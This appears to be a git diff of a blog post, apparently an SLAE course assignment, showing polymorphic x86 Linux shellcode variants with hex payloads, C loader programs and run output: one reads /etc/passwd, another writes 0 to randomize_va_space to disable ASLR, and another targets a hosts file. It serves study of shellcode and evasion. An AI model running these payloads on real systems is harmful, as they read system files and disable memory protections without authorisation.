@@ -95,10 +95,9 @@ tags:
 <p style="text-align:justify;">Furthermore, the <strong>mov ebx, esp</strong> instruction will be used to set the new base pointer at the top of the stack after pushing all the function parameters into the stack.</p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">mov ebx, esp</pre>
 <p style="text-align:justify;">Additionally, for the sake of polymorphism the following <strong>open</strong> system call will be used instead of the one discussed before which initially used from the original <em>shellcode</em>.  </p>
-
-```c
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 int open(const char *pathname, int flags, mode_t mode);
-```
+</pre>
 
 <p style="text-align:justify;">The function above has one extra argument named <strong>mode</strong> of type mode_t. The argument <strong>mode</strong> represents the permissions in case a new file is created using the <strong>open</strong> function call with the <strong>O_CREAT</strong> flag. If a new file is not being created then this argument is ignored. In this case the <em>shellcode</em> only reads from <strong>/etc/passwd</strong> file which is a system file already created from the Linux operating system. According to the <strong>open</strong> function prototype one extra instruction will be added that will assign the extra mode to the opened file.</p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#99cc00;"><span style="color:#00ffff;">;Altered Shellcode Instruction</span><br /><span style="color:#00ff00;">mov dx, 0x1bc</span></span></pre>
@@ -109,10 +108,10 @@ int open(const char *pathname, int flags, mode_t mode);
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xchg eax,ebx</pre>
 <p style="text-align:justify;">The <strong>open</strong> system call returns a file descriptor of the open file, along with the assigned permissions which can be used to allow reading the file. The <strong>eax</strong> register is holding the returned file descriptor from the <strong>open</strong> system call which will then be assigned at <strong>ebx</strong> register when the instruction executes. The <strong>ebx</strong> register represents the first argument of the <strong>read</strong> system call. Also, the <b>eax </b>register will temporarily hold the data returned from the open system call. The <strong>read</strong> system call synopsis can be seen <a>here</a></p>
 
-```c
-#include <unistd.h>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+#include &lt;unistd.h>
 ssize_t read(int fd, void *buf, size_t count);
-```
+</pre>
 
 <p style="text-align:justify;">The <strong>read</strong> system call takes three arguments, the file descriptor <strong>fd</strong> of type int , the buffer <strong>buf</strong> of type void* holding the data to be read and the <strong>count</strong> of type size_t which provides the size of the data stored in <strong>buf.  </strong> Now that the <strong>ebx</strong> register holds the file descriptor, using the next instruction</p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xchg eax,ecx</pre>
@@ -153,10 +152,11 @@ ssize_t read(int fd, void *buf, size_t count);
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./polytiny|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'<br />"\xc1\xe9\x10\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x73\x73\x77\x64\xc7\x44\x24\xf4\x63\x2f\x70\x61\xc7\x44\x24\xf0\x2f\x2f\x65\x74\x83\xec\x10\x89\xe3\x66\xba\xbc\x01\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xfe\x0f\x66\x42\xcd\x80\x31\xc0\xb0\x04\x80\xeb\x02\xcd\x80\xc1\xe8\x10\xfe\xc0\xcd\x80"</pre>
 <p style="text-align:justify;">The following program will be used to deliver the execution of the new polymorphic <em>shellcode</em></p>
 
-```c
 
-#include <stdio.h>
-#include <srting.h>
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
+#include &lt;stdio.h>
+#include &lt;srting.h>
 
 unsigned char code[] = \
      "\xc1\xe9\x10\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\xc7"
@@ -175,7 +175,7 @@ int (*ret)() = (int(*)())code;
 
 ret();
 }
-```
+</pre>
 
 <p style="text-align:justify;">As seen below, compiling and running the code above will give the same output as the original <em>shellcode <br /></em></p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">root@slae:/home/xenofon/Documents/Assignment6# gcc -fno-stack-protector -g -z execstack -m32 -o shellcode shellcode.c &amp;&amp; ./shellcode <br />Shellcode Length: 76<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br />bin:x:2:2:bin:/bin:/bin/sh<br />sys:x:3:3:sys:/dev:/bin/sh<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/bin/sh<br />man:x:6:12:man:/var/cache/man:/bin/sh<br />lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br />mail:x:8:8:mail:/var/mail:/bin/sh<br />news:x:9:9:news:/var/spool/news:/bin/sh<br />uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br />proxy:x:13:13:proxy:/bin:/bin/sh<br />www-data:x:33:33:www-data:/var/www:/bin/sh<br />backup:x:34:34:backup:/var/backups:/bin/sh<br />list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br />irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br />nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br />libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br />syslog:x:101:103::/home/syslog:/bin/false<br />messagebus:x:102:105::/var/run/dbus:/bin/false<br />colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false<br />lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false<br />whoopsie:x:105:114::/nonexistent:/bin/false<br />avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false<br />avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false<br />usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false<br />kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br />pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br />rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false<br />speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh<br />hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br />saned:x:114:123::/home/saned:/bin/false<br />vboxadd:x:999:1::/var/run/vboxadd:/bin/false<br />xenofon:x:1001:1001:Xenofon,,,:/home/xenofon:/bin/bash<br />sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin<br />postgres:x:1002:1002::/home/postgres:/bin/sh</pre>
@@ -213,14 +213,16 @@ ret();
 <p style="text-align:justify;">The <strong>xor ebx, ebx</strong> used to zero out the <strong>ebx</strong> register. Then the<strong> mul ebx</strong> instruction used to zero out the <strong>eax</strong> register because the <strong>mul</strong> instruction is performing multiplication with the <strong>eax</strong> register. So, in the current case there is an additional extra instruction that is performing a zero out operation to <strong>ebx</strong> register without causing any alteration of the initially intended functionality. Additionally, one possible drawback of using the extra instruction is that it could probably increase the length of the final <em>shellcode</em>, but this  will be considered later. According with the analysis until now, the <strong>creat()</strong> system call will be used to open the <strong>/proc/sys/kernel/randomize_va_space</strong> file. Furthermore, the <em>shellcode</em> will push the arguments into the stack using the stack method.</p>
 <p style="text-align:justify;">Following, the <strong>creat()</strong> system call is shown and the full synopsis can be found at <a href="https://linux.die.net/man/3/creat">creat(3)</a> man page</p>
 
-```c 
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
 int creat(const char *pathname, mode_t mode);
-```
+</pre>
 
 <p style="text-align:justify;">The <strong>creat()</strong> system call returns an integer. There are also two arguments passed to the function, the first is the <strong>pathname</strong> of type<em> char*</em> and the second one is the <strong>mode</strong> of type <em>mode_t</em>. Additionally, according to <strong>creat()</strong> general description, the <strong>creat()</strong> system call is equivalent with the following call :</p>
-```c 
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
 open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)
-```
+</pre>
+
 <p style="text-align:justify;">Thus the file named by <span class="ph synph"><span class="ph var">pathname</span></span> is created, unless it already exists. Furthermore, the next instructions will push the following path <strong>/proc/sys/kernel/randomize_va_space</strong> into the stack in order to pass the first argument of the <strong>creat()</strong> system call.</p>
 <p>The next instruction will push the <strong>eax</strong> register into the stack</p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">push eax </pre>
@@ -249,9 +251,9 @@ open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)</pre>
 <p>is equivalent to the following <strong>creat()</strong> function call</p>
 
-```c
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
 creat(path, mode)
-```
+</pre>
 
 <p style="text-align:justify;">Following, in order to create polymorphism, the instructions implementing the <strong>open()</strong> system call will be changed using the additional instructions for the second and third argument of the <strong>open()</strong> system call. To proceed further, the hex values of <strong>O_CREAT | O_WRONLY | O_TRUNC</strong> flags must be known in order to use them as the second argument at <strong>open()</strong> system call. To this end, checking inside the /<em>usr/src/linux-headers-3.13.0-32/arch/mips/include/uapi/asm/fcntl.h</em> file the hex values of the flags above are seen below</p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">#define O_CREAT  0x0100<br />#define O_TRUNC  0x0200</pre>
@@ -328,9 +330,11 @@ mov al, 0x4
 
 the above instructions are representing the following system call
 
-```c
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 sys_write(fd,"0;",1);
-```
+</pre>
+
+
 
 The **mov ebx, eax** instruction assigns the value of file descriptor existing in **eax** register into the **ebx** register. Also, checking at the [Linux Syscall Reference](https://syscalls.kernelgrok.com/), the **ebx** register consists the first argument of the **write()** system call. Afterwards, the instruction **push ebx** pushes the file descriptor into the stack. The second argument of the **write()&nbsp;**system call referenced by the **ecx** register consists the buffer that contains the value to write inside the file. Also, the third argument referenced by the **edx** register consists the size of the buffer where in this case is one(1) byte. The instruction **mov cx, 0x3b30** represents the second argument meaning that the value **0;** will be inserted into the **cx** register containing the size of the buffer. Furthermore, the **0x3a30** hex original value altered into **0x3b30** changing " **:**" to " **;**" which does not negatively affect the execution of the program as it is not interpreted in the execution. Also, the 16bit **cx** &nbsp;register has been chosen instead of **ecx** in order to avoid producing any null bytes. As seen at the instructions above, the buffer that contains the **0** value indicating the non randomisation action of the system memory. Additionally, the **';'** value is irrelevant because the size of the buffer is only one(1) byte long, thus the **0** value will only be taken as valid. After moving the chars **"0;"** inside the second argument of the **write()** function, the instruction **mov ecx, esp** will be provided in order to align the stack pointer at the beginning of the stack. As mentioned before, the final argument contains the value of the size of the buffer which must be **1** , so the altered instructions to achieve this change, first must zero out the lower 16bits from **edx** register. To achieve this, the instruction **shr edx,16** will be used which shifts the **edx** lower 16bits by sixteen positions to the right, thus zeroing out the **edx** register. Then, the **edx** register will be increased by one in order to provide the size of the buffer to the **write()** system call. Following, a common way to call the **write()&nbsp;**system call is by using **mov al, 0x4** instruction which assigns the **0x4** immediate value to the **al** lower byte register. Then the instruction **int 0x80** is called to execute the **write()&nbsp;**system call **.**
 
@@ -452,7 +456,7 @@ From the output above it seems that there are no null bytes around, so using **o
 
 Afterwards the produced _shellcode_ will be added into a C program named **sh.c** in order to deliver the execution of the polimorphic shellcode.
 
-```C
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 #include 
 #include 
 
@@ -480,7 +484,7 @@ int (*ret)() = (int(*)())code;
 
 ret();
 }
-```
+</pre>
 
 Compiling and running the above program will change the value inside the **/proc/sys/kernel/randomize\_va\_space** from **two(2)** to **zero(0)**.
 
@@ -805,9 +809,9 @@ Following is the C program file where the polymorphic <it>shellcode</it> will be
 </p>
 
 
-```c
-#include <stdio.h>
-#include <string.h> 
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+#include &lt;stdio.h>
+#include &lt;string.h> 
 
 unsigned char code[] = \
 "\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x
@@ -824,7 +828,7 @@ int (*ret)() = (int(*)())code;
 
 ret();
 }
-```
+</pre>
 
 Next the executable will be compiled and run as seen below
 
